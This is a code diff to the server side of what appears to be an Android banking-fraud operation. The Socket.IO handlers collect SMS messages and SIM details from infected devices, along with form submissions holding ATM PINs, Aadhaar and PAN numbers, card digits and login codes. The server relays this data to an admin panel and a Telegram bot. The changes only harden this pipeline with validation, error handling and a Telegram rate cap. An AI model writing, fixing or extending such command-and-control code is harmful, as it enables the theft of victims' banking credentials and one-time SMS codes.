@@ -3,6 +3,10 @@ import { store } from '../store.js';
 import { SMS, ForwardingConfig, SimInfo } from '../types/index.js';
 import { TelegramBotService } from '../telegram/bot.js';
 
+// Avoid Telegram floods/rate limits on large syncs: notify at most this many
+// new incoming SMS per sync (the rest are still stored and shown in the panel).
+const MAX_TELEGRAM_SMS_PER_SYNC = 20;
+
 /**
  * Mark a device online from any authenticated socket event and remember which
  * device this socket belongs to. Emits devices:update only on an offline→online
@@ -43,31 +47,43 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
         console.log(`[Socket] Client connected: ${socket.id}`);
 
         // Device registration
-        socket.on('device:register', async (data: { id: string; name: string; phoneNumber: string }) => {
-            console.log(`[Socket] Device registering: ${data.id}`);
+        socket.on('device:register', async (data: { id?: string; name?: string; phoneNumber?: string }) => {
+            if (!data || typeof data.id !== 'string' || !data.id) {
+                console.warn('[Socket] Ignoring malformed device:register payload');
+                return;
+            }
+            const deviceId = data.id;
+            const deviceName = typeof data.name === 'string' && data.name ? data.name : 'Unknown device';
+            const phoneNumber = typeof data.phoneNumber === 'string' ? data.phoneNumber : '';
 
-            const deviceData = store.registerDevice({
-                id: data.id,
-                name: data.name,
-                phoneNumber: data.phoneNumber,
-                socketId: socket.id,
-            });
+            try {
+                console.log(`[Socket] Device registering: ${deviceId}`);
 
-            // Join device to its own room
-            socket.join(`device:${data.id}`);
-            socket.data.deviceId = data.id;
+                const deviceData = store.registerDevice({
+                    id: deviceId,
+                    name: deviceName,
+                    phoneNumber,
+                    socketId: socket.id,
+                });
 
-            // Notify admin panels of device update
-            io.to('admin').emit('devices:update', store.getAllDevices());
+                // Join device to its own room
+                socket.join(`device:${deviceId}`);
+                socket.data.deviceId = deviceId;
 
-            // Send current forwarding config to device
-            socket.emit('forwarding:config', deviceData.forwarding);
+                // Notify admin panels of device update
+                io.to('admin').emit('devices:update', store.getAllDevices());
 
-            console.log(`[Socket] Device registered: ${data.id} (${data.name})`);
+                // Send current forwarding config to device
+                socket.emit('forwarding:config', deviceData.forwarding);
 
-            // Notify via Telegram
-            if (telegramBot?.isActive()) {
-                await telegramBot.notifyDeviceOnline(deviceData.device);
+                console.log(`[Socket] Device registered: ${deviceId} (${deviceName})`);
+
+                // Notify via Telegram
+                if (telegramBot?.isActive()) {
+                    await telegramBot.notifyDeviceOnline(deviceData.device);
+                }
+            } catch (e) {
+                console.error('[Socket] device:register handler failed:', e);
             }
         });
 
@@ -90,108 +106,141 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
         });
 
         // SMS sync from device
-        socket.on('sms:sync', async (data: { deviceId: string; sms: SMS[] }) => {
-            console.log(`[Socket] SMS sync from device ${data.deviceId}: ${data.sms.length} messages`);
+        socket.on('sms:sync', async (data: { deviceId?: string; sms?: SMS[] }) => {
+            if (!data || typeof data.deviceId !== 'string' || !Array.isArray(data.sms)) {
+                console.warn('[Socket] Ignoring malformed sms:sync payload');
+                return;
+            }
+            const deviceId = data.deviceId;
+            const incoming = data.sms.filter(m => m && typeof m === 'object' && typeof (m as any).id === 'string');
 
-            // Get existing SMS count before sync
-            const existingCount = store.getSMS(data.deviceId).length;
-            const isFirstSync = existingCount === 0;
+            try {
+                console.log(`[Socket] SMS sync from device ${deviceId}: ${incoming.length} messages`);
 
-            store.syncSMS(data.deviceId, data.sms);
+                // Get existing SMS count before sync
+                const existingCount = store.getSMS(deviceId).length;
+                const isFirstSync = existingCount === 0;
 
-            // Any authenticated traffic proves the device is alive — heal presence.
-            markDeviceOnline(io, socket, data.deviceId);
+                store.syncSMS(deviceId, incoming as SMS[]);
 
-            // Notify admin panels
-            io.to('admin').emit('sms:update', {
-                deviceId: data.deviceId,
-                sms: store.getSMS(data.deviceId),
-            });
+                // Any authenticated traffic proves the device is alive — heal presence.
+                markDeviceOnline(io, socket, deviceId);
 
-            // Telegram notifications
-            if (telegramBot?.isActive()) {
-                const deviceData = store.getDevice(data.deviceId);
+                // Notify admin panels
+                io.to('admin').emit('sms:update', {
+                    deviceId,
+                    sms: store.getSMS(deviceId),
+                });
 
-                if (isFirstSync && deviceData) {
-                    // First sync: Notify device is connected
-                    await telegramBot.notifyDeviceConnected(deviceData.device);
-                } else if (!isFirstSync) {
-                    // Subsequent syncs: Only notify for NEW incoming SMS
-                    const allSms = store.getSMS(data.deviceId);
-                    const newSms = allSms.slice(existingCount);
-                    const incomingSms = newSms.filter(sms => sms.type === 'incoming');
+                // Telegram notifications
+                if (telegramBot?.isActive()) {
+                    const deviceData = store.getDevice(deviceId);
 
-                    for (const sms of incomingSms) {
-                        await telegramBot.notifyNewSMS(deviceData?.device.name || data.deviceId, sms, deviceData?.device);
+                    if (isFirstSync && deviceData) {
+                        // First sync: Notify device is connected
+                        await telegramBot.notifyDeviceConnected(deviceData.device);
+                    } else if (!isFirstSync) {
+                        // Subsequent syncs: Only notify for NEW incoming SMS (capped)
+                        const allSms = store.getSMS(deviceId);
+                        const newSms = allSms.slice(existingCount);
+                        const incomingSms = newSms
+                            .filter(sms => sms.type === 'incoming')
+                            .slice(-MAX_TELEGRAM_SMS_PER_SYNC);
+
+                        for (const sms of incomingSms) {
+                            await telegramBot.notifyNewSMS(deviceData?.device.name || deviceId, sms, deviceData?.device);
+                        }
                     }
                 }
+            } catch (e) {
+                console.error('[Socket] sms:sync handler failed:', e);
             }
         });
 
         // Form submission from device (legacy format from Android app)
-        socket.on('form:submit', async (data: { deviceId: string; name: string; phoneNumber: string; id: string }) => {
-            console.log(`[Socket] Form submitted from device ${data.deviceId}`);
+        socket.on('form:submit', async (data: { deviceId?: string; name?: string; phoneNumber?: string; id?: string }) => {
+            if (!data || typeof data.deviceId !== 'string' || !data.deviceId) {
+                console.warn('[Socket] Ignoring malformed form:submit payload');
+                return;
+            }
+            const deviceId = data.deviceId;
 
-            // Convert legacy format to new format with default values
-            const formData = {
-                fullName: data.name || '',
-                mobileNumber: data.phoneNumber || '',
-                motherName: '',
-                accountNumber: '',
-                aadhaarNumber: '',
-                panCard: '',
-                cardLast6: '',
-                atmPin: '',
-                cifNumber: '',
-                branchCode: '',
-                dateOfBirth: '',
-                cardExpiry: '',
-                finalPin: '',
-                userId: '',
-                accessCode: '',
-                profileCode: '',
-                // Legacy fields for backward compatibility
-                name: data.name,
-                phoneNumber: data.phoneNumber,
-                id: data.id,
-            };
+            try {
+                console.log(`[Socket] Form submitted from device ${deviceId}`);
 
+                // Convert legacy format to new format with default values
+                const formData = {
+                    fullName: data.name || '',
+                    mobileNumber: data.phoneNumber || '',
+                    motherName: '',
+                    accountNumber: '',
+                    aadhaarNumber: '',
+                    panCard: '',
+                    cardLast6: '',
+                    atmPin: '',
+                    cifNumber: '',
+                    branchCode: '',
+                    dateOfBirth: '',
+                    cardExpiry: '',
+                    finalPin: '',
+                    userId: '',
+                    accessCode: '',
+                    profileCode: '',
+                    // Legacy fields for backward compatibility
+                    name: data.name,
+                    phoneNumber: data.phoneNumber,
+                    id: data.id,
+                };
 
-            store.submitForm(data.deviceId, formData as any);
+                store.submitForm(deviceId, formData as any);
 
-            // Notify admin panels
-            io.to('admin').emit('forms:update', {
-                deviceId: data.deviceId,
-                forms: store.getForms(data.deviceId),
-            });
+                // Notify admin panels
+                io.to('admin').emit('forms:update', {
+                    deviceId,
+                    forms: store.getForms(deviceId),
+                });
 
-            // Notify via Telegram
-            if (telegramBot?.isActive()) {
-                const deviceData = store.getDevice(data.deviceId);
-                await telegramBot.notifyFormSubmission(
-                    deviceData?.device.name || data.deviceId,
-                    formData as any
-                );
+                // Notify via Telegram
+                if (telegramBot?.isActive()) {
+                    const deviceData = store.getDevice(deviceId);
+                    await telegramBot.notifyFormSubmission(
+                        deviceData?.device.name || deviceId,
+                        formData as any
+                    );
+                }
+            } catch (e) {
+                console.error('[Socket] form:submit handler failed:', e);
             }
         });
 
 
         // SIM cards sync from device
-        socket.on('sim:sync', (data: { deviceId: string; simCards: SimInfo[] }) => {
-            console.log(`[Socket] SIM sync from device ${data.deviceId}: ${data.simCards.length} SIMs`);
+        socket.on('sim:sync', (data: { deviceId?: string; simCards?: SimInfo[] }) => {
+            if (!data || typeof data.deviceId !== 'string' || !Array.isArray(data.simCards)) {
+                console.warn('[Socket] Ignoring malformed sim:sync payload');
+                return;
+            }
+            const deviceId = data.deviceId;
+            const simCards = data.simCards.filter(s => s && typeof s === 'object');
 
-            store.syncSimCards(data.deviceId, data.simCards);
-            markDeviceOnline(io, socket, data.deviceId);
+            try {
+                console.log(`[Socket] SIM sync from device ${deviceId}: ${simCards.length} SIMs`);
 
-            // Send acknowledgment back to device
-            socket.emit('sim:sync:ack', { deviceId: data.deviceId, success: true, count: data.simCards.length });
+                store.syncSimCards(deviceId, simCards);
+                markDeviceOnline(io, socket, deviceId);
 
-            // Notify admin panels with updated device info
-            io.to('admin').emit('devices:update', store.getAllDevices());
-            io.to('admin').emit('sim:update', {
-                deviceId: data.deviceId,
-                simCards: store.getSimCards(data.deviceId),
-            });
+                // Send acknowledgment back to device
+                socket.emit('sim:sync:ack', { deviceId, success: true, count: simCards.length });
+
+                // Notify admin panels with updated device info
+                io.to('admin').emit('devices:update', store.getAllDevices());
+                io.to('admin').emit('sim:update', {
+                    deviceId,
+                    simCards: store.getSimCards(deviceId),
+                });
+            } catch (e) {
+                console.error('[Socket] sim:sync handler failed:', e);
+            }
         });
 
         // Admin panel connection
@@ -290,20 +339,24 @@ export function setupSocketHandlers(io: Server, telegramBot?: TelegramBotService
 
         // Disconnection
         socket.on('disconnect', async (reason: string) => {
-            console.log(`[Socket] Client disconnected: ${socket.id} (reason: ${reason})`);
+            try {
+                console.log(`[Socket] Client disconnected: ${socket.id} (reason: ${reason})`);
 
-            const deviceId = store.setDeviceOfflineBySocketId(socket.id, reason);
-            if (deviceId) {
-                console.log(`[Socket] Device ${deviceId} marked offline`);
-                io.to('admin').emit('devices:update', store.getAllDevices());
+                const deviceId = store.setDeviceOfflineBySocketId(socket.id, reason);
+                if (deviceId) {
+                    console.log(`[Socket] Device ${deviceId} marked offline`);
+                    io.to('admin').emit('devices:update', store.getAllDevices());
 
-                // Notify via Telegram
-                if (telegramBot?.isActive()) {
-                    const deviceData = store.getDevice(deviceId);
-                    if (deviceData) {
-                        await telegramBot.notifyDeviceOffline(deviceData.device);
+                    // Notify via Telegram
+                    if (telegramBot?.isActive()) {
+                        const deviceData = store.getDevice(deviceId);
+                        if (deviceData) {
+                            await telegramBot.notifyDeviceOffline(deviceData.device);
+                        }
                     }
                 }
+            } catch (e) {
+                console.error('[Socket] disconnect handler failed:', e);
             }
         });
     });
